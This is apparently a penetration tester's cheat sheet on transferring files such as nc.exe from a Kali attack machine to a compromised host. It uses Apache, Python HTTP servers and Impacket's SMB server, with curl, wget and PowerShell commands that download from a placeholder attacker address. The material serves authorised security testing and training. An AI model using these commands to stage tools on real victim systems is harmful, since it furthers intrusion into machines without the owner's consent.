# Transfering Files

Often times on an engagement I find myself needing to copy a tool or a payload from my Kali linux attack box to a compromised machine.

## HTTP
The two ways I usually serve a file over HTTP from Kali are either through Apache or through a Python HTTP server.

### Apache
To serve a file up over Apache, just simply copy it to /var/www/html and enable the Apache service. Apache is installed by default in Kali:
```
root@kali:~/shells# cp nc.exe /var/www/html
root@kali:~/shells# systemctl start apache
```

### Python
The other option is to just start a Python webserver directly inside the shells directory. This only requires a single line of Python thanks to Python’s SimpleHTTPServer module:

```
python -m SimpleHTTPServer 8080
```
```
python3 -m http.server
```
By default it serves on port 8000, but you can also specify a port number at the end.

### Downloading the files
Browser
Simply browse to http://YOUR-KALI-IP/nc.exe and use the browser to download the file.

#### Command line

#### Linux

##### cUrl
```
curl https//YOUR-KALI-IP/nc.exe -o nc.exe
```
##### wget
```
wget -O nc.exe http://YOUR-KALI-IP/nc.exe
```

#### Windows 
##### Powershell
```
(new-object System.Net.WebClient).DownloadFile('http://YOUR-KALI-IP/nc.exe','C:\Users\<user>\Desktop\nc.exe')
```
##### CMD
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://YOUR-KALI-IP/nc.exe','C:\Users\<user>\Desktop\nc.exe')"
```

## SMB

### Setting up the server
Quick and dirty

Enter smbserver.py, part of the Impacket project,the python script takes care of all the configurations for you, binds to 445, and accepts any authentication. It will even print out the hashed challenge responses for any system that connects to it.
`cd` to `/opt/impacket/examples`
```
python smbserver.py ROPNOP /root/shells
```
In one line we’ve got an SMB share up and running. You can confirm it with smbclient from Linux:
```
smbclient -L <kali-ip> --no-pass
```
Windows:
```
net view \\<kali-ip>
```

#### Copying Files
Putting files using smbclient once you connect to it using `smbclient -L <kali-ip> --no-pass`
```
put nc.exe 
```
Getting files
Linux
```
get nc.exe .
```
On windows
```
dir \\<kali-ip>\ROPNOP
copy \\<kali-ip>\ROPNOP\nc.exe .
```